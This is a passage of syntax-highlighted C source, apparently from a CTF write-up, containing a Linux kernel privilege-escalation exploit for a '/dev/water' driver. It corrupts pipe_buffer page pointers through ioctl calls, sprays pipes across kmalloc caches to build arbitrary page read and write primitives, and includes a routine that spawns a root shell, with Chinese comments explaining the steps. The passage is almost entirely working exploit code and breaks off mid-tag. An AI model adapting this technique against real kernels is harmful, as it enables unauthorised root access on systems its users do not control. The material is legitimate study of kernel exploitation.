class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>, vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bind_core</span><span class="params">(<span class="keyword">int</span> core)</span></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"> </span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">void</span> *p, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(size % <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i += <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%04x :  %02X %02X %02X %02X %02X %02X %02X %02X     0x%lx\n&quot;</span>, </span><br><span class="line">                i, buf[i+<span class="number">0</span>], buf[i+<span class="number">1</span>], buf[i+<span class="number">2</span>], buf[i+<span class="number">3</span>], buf[i+<span class="number">4</span>], buf[i+<span class="number">5</span>], buf[i+<span class="number">6</span>], buf[i+<span class="number">7</span>], *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errPrint</span><span class="params">(<span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">        <span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">        <span class="keyword">int</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">        <span class="keyword">int</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> self_4th_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_2nd_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> self_3rd_pipe_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_2nd_buf</span>, <span class="title">evil_3rd_buf</span>, <span class="title">evil_4th_buf</span>;</span></span><br><span class="line"><span class="keyword">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_list[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read_by_pipe</span><span class="params">(struct page *page_to_read, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_3rd_pipe_idx][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"> </span><br><span class="line">    read(pipe_list[self_2nd_pipe_idx][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write_by_pipe</span><span class="params">(struct page *page_to_write, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_3rd_pipe_idx][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_4th_pipe_idx][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"> </span><br><span class="line">    write(pipe_list[self_2nd_pipe_idx][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"> </span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/water&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0x31</span>,<span class="number">0x200</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x20</span>,&amp;buf);</span><br><span class="line">    ioctl(fd,<span class="number">0x30</span>,&amp;buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pipe(pipe_list[i]) == <span class="number">-1</span>)&#123;</span><br><span class="line">            errPrint(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">            <span class="comment">/* 8 * pipe_buffer = 0x180 kmalloc-512 */</span> </span><br><span class="line">            errPrint(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>); <span class="comment">// tag</span></span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], <span class="string">&quot;AAAAAAAA&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_list[i][<span class="number">1</span>], <span class="string">&quot;BBBBBBBB&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x200</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x50</span>,&amp;buf); <span class="comment">/* 覆盖pipe_buffer-&gt;page末尾字节 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> victim_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> orig_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>  i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">char</span> tag[<span class="number">0x10</span>];</span><br><span class="line">        <span class="keyword">int</span> nr;</span><br><span class="line">        <span class="built_in">memset</span>(tag, <span class="number">0</span>, <span class="keyword">sizeof</span>(tag));</span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], tag, <span class="number">8</span>);</span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tag, <span class="string">&quot;AAAAAAAA&quot;</span>) &amp;&amp; nr != i)&#123;</span><br><span class="line">            orig_idx = nr;</span><br><span class="line">            victim_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found index-%d and index-%d point the same page \033[0m\n&quot;</span>,victim_idx, orig_idx);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (orig_idx == <span class="number">-1</span> || victim_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;can&#x27;t find&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;p&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    write(pipe_list[victim_idx][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    close(pipe_list[orig_idx][<span class="number">0</span>]); <span class="comment">/* 释放其中一个pipe_buffer */</span></span><br><span class="line">    close(pipe_list[orig_idx][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write down&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123; </span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">            <span class="comment">/* 2 * pipe_buffer = 0x60 kmalloc-96 */</span> </span><br><span class="line">            errPrint(<span class="string">&quot;Fcntl Pipe&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(pipe_list[victim_idx][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    print_hex(buf,SND_PIPE_BUF_SZ - <span class="number">8</span>);</span><br><span class="line">    read(pipe_list[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    print_hex((<span class="keyword">char</span>*)&amp;info_pipe_buf,<span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">    info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">    info_pipe_buf.page = (struct page *)((<span class="keyword">size_t</span>)info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">    write(pipe_list[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> snd_orig_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> snd_victim_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123; <span class="comment">/* 第二次堆喷 */</span></span><br><span class="line">        <span class="keyword">int</span> nr;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (i &lt; PIPE_NUM &amp;&amp; i != nr)&#123;</span><br><span class="line">            snd_orig_idx = nr;</span><br><span class="line">            snd_victim_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found index-%d and index-%d point the same page \033[0m\n&quot;</span>,snd_victim_idx, snd_orig_idx);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (snd_orig_idx == <span class="number">-1</span> || snd_victim_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">        errPrint(<span class="string">&quot;can&#x27;t find&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;k&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    close(pipe_list[snd_orig_idx][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_list[snd_orig_idx][<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_list[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">/* 4 * pipe_buffer = 0xc0 kmalloc-192 */</span> </span><br><span class="line">            errPrint(<span class="string">&quot;Fcntl Pipe&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fcntl down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">    evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">    evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line"></span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,page_ptr);</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)&#123;</span><br><span class="line">            self_2nd_pipe_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe:\033[0m%d\n&quot;</span>,</span><br><span class="line">                    self_2nd_pipe_idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">&#x27;n&#x27;</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line">    write(pipe_list[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;change pipe_buffer down&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(2);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_idx || i == victim_idx || i == snd_orig_idx || i == snd_victim_idx || i == self_2nd_pipe_idx)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_list[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,page_ptr);</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)&#123;</span><br><span class="line">            self_3rd_pipe_idx = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>,</span><br><span class="line">                    self_3rd_pipe_idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span 